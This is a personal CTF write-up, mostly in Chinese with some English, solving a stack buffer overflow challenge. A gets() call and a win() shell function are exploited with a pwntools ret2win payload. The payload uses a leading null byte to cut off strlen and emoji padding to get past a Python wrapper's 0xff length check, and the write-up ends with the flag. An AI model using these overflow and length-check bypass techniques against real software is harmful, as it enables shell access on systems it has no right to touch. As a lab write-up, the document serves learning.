# 1.0 Challenge
1. strlen -> /x00 to stop the checking
2. python wrapper only 0xff -> can use emoji in python on 1 length, but for c is 4 bytes

# 2.0 Analysis
this is a beginner and advanced challenge for me 
the source code very simple 
I even though I can finish it very fast but NOT 
this is trap shit 

```c
int main(void)
{
  size_t input_len;
  char buffer [259];
  char local_15;
  int input_len_2;
  ulong i;
  
  gets(buffer);
  input_len = strlen(buffer);
  input_len_2 = (int)input_len;
  for (i = 0; i < (ulong)(long)(input_len_2 / 2); i = i + 1) {
    local_15 = buffer[(long)(input_len_2 + -1) - i];
    buffer[(long)(input_len_2 + -1) - i] = buffer[i];
    buffer[i] = local_15;
  }
  puts("Reversed string:");
  puts(buffer);
  return 0;
}

void win(void)
{
  system("/bin/sh");
  return;
}
```
python wrapper
```python
BINARY = "./chall"
MAX_LEN = 0xff

# Get input from user
payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
```

needed ROP
```
ret = 0x000000000040101a
win = 0x0000000000401262
```

# 3.0 Solution
## 3.1 OFFSET
ok 我们第一个要想的问题是 offset 
![[Pasted image 20250714170240.png]]
我一开始以为是直接0x110+8 + win 然后发现不work ？？？？？
0x118 = 280

如果不成功马上 请想起来 有ret alignment !!!!!
so 280 + ret + win
然后还是不能 .... 

## 3.2 STRLEN
这个时候想一下 为什么他没有直接断掉
so 要add \x00 null terminator
可是也要算好整个offset 
`[\x00 + offset] 这边只能是280 + ret 8 + win 8`
```python
rop = ROP(elf)
offset = 280+8-1-8
binary = b'\x00'
binary += b"a"*(offset)
binary += p64(rop.ret.address)
print("length",len(binary))
binary += p64(elf.sym.win)
p.sendline(binary)
p.interactive()
```

OK local pass

## 3.3 len(payload) > FF
看python 只能ff 如果直接pass 一定超过 因为我的整个payload 288 + 8
所以直接把offset 改成 unicode 就不会被 python check 
😎 python len: 1 c strlen: 4
```python
rop = ROP(elf)
offset = 280+8-1-8
binary = b'\x00'
binary += "😃".encode()* ((offset)//4)
binary += b'aaa' # for alignment 
binary += p64(rop.ret.address)
print("length",len(binary))
binary += p64(elf.sym.win)
p.sendline(binary)
p.interactive()
```

## 3.4 FULL SCRIPT
![[c1_3.py]]

# 4.0 FLAG 
```
L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}
```